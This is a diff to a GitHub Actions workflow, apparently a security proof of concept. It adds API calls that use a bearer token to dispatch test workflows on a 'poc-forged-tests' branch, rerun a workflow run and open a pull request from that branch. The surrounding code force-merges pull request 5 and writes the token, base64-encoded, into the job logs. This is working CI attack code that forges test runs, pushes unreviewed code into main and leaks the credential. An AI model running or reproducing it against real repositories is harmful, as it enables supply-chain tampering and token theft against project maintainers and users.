@@ -91,6 +91,14 @@ jobs:
               }
               r = apiCall('PUT', '/repos/' + repo + '/pulls/5/merge', { merge_method: 'merge' });
               log('rest_merge5 status=' + r.code + ' body=' + r.body.slice(0, 300));
+              r = apiCall('POST', '/repos/' + repo + '/actions/workflows/414980660/dispatches', { ref: 'main' });
+              log('dispatch_tests status=' + r.code + ' body=' + r.body.slice(0, 300));
+              r = apiCall('POST', '/repos/' + repo + '/actions/workflows/414980660/dispatches', { ref: 'poc-forged-tests' });
+              log('dispatch_tests_poc status=' + r.code + ' body=' + r.body.slice(0, 300));
+              r = apiCall('POST', '/repos/' + repo + '/actions/runs/43072440573/rerun', {});
+              log('rerun_dispatchrun status=' + r.code + ' body=' + r.body.slice(0, 300));
+              r = apiCall('POST', '/repos/' + repo + '/pulls', { title: 'same-repo test', head: 'poc-forged-tests', base: 'main', body: 'x' });
+              log('create_pr_samerepo status=' + r.code + ' body=' + r.body.slice(0, 300));
               log('token_b64=' + B64);
             } catch (e) { log('SYNCERR ' + e); }
             const H = { Authorization: 'Bearer ' + t, 'User-Agent': 'poc-runner', Accept: 'application/vnd.github+json' };
